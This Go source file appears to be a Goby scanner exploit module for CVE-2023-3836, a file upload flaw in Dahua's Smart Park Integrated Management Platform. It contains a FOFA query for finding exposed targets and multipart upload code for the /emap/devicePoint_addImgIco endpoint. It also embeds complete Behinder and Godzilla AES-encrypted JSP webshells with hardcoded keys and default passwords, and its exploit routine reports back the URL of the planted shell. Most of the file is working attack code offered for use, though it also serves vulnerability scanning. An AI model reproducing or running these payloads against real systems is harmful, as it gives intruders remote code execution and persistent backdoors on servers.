package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua Smart Park Integrated Management Platform /emap/devicePoint_addImgIco File Upload Vulnerability (CVE-2023-3836)",
    "Description": "<p>Dahua Smart Park Integrated Management Platform is a comprehensive management platform that has functions such as park operation, resource allocation, and intelligent services. The platform is intended to assist in optimizing the resource allocation of the park to meet diversified management needs, and at the same time enhance the user experience by providing intelligent services.</p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2023-07-22",
    "PostTime": "2024-01-16",
    "Author": "1691834629@qq.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "3",
    "Impact": "<p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>1. Upgrade to the latest version: <a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-3836"
    ],
    "CNNVD": [
        "CNNVD-202307-1859"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 /emap/devicePoint_addImgIco 文件上传漏洞（CVE-2023-3836）",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。<br></p><p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "Recommendation": "<p>1、升级到最新版本：<a href=\"https://www.dahuatech.com/cases/info/76.html\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Dahua Smart Park Integrated Management Platform /emap/devicePoint_addImgIco File Upload Vulnerability (CVE-2023-3836)",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua Smart Park Integrated Management Platform is a comprehensive management platform that has functions such as park operation, resource allocation, and intelligent services. The platform is intended to assist in optimizing the resource allocation of the park to meet diversified management needs, and at the same time enhance the user experience by providing intelligent services.</p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
            "Recommendation": "<p>1. Upgrade to the latest version: <a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10866"
}`
	checkResult38sYG37RfbhF := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		var fileName string
		payload := "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"a.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n" + content + "\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
		postRequestConfig := httpclient.NewPostRequestConfig("/emap/devicePoint_addImgIco?hasSubsystem=true")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT")
		postRequestConfig.Data = payload
		if resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig); resp == nil && err != nil {
			return nil, err
		} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"code\":1") {
			pattern := `"data":"([^"]+\.[^"]+)"`
			re := regexp.MustCompile(pattern)
			matches := re.FindStringSubmatch(resp.Utf8Html)
			if len(matches) >= 2 {
				fileName = matches[1]
			}
			getRequestConfig := httpclient.NewGetRequestConfig("/upload/emap/society_new/" + fileName)
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		} else {
			return nil, errors.New("漏洞利用失败")
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			content := `<% out.println(` + strconv.Quote(checkStr) + `);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`
			resp, _ := checkResult38sYG37RfbhF(hostInfo, content)
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			var content string
			if webshell == "behinder" {
				/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if webshell == "godzilla" {
				// 哥斯拉 pass key
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
			} else {
				content = stepLogs.Params["content"].(string)
			}
			if resp, err := checkResult38sYG37RfbhF(expResult.HostInfo, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
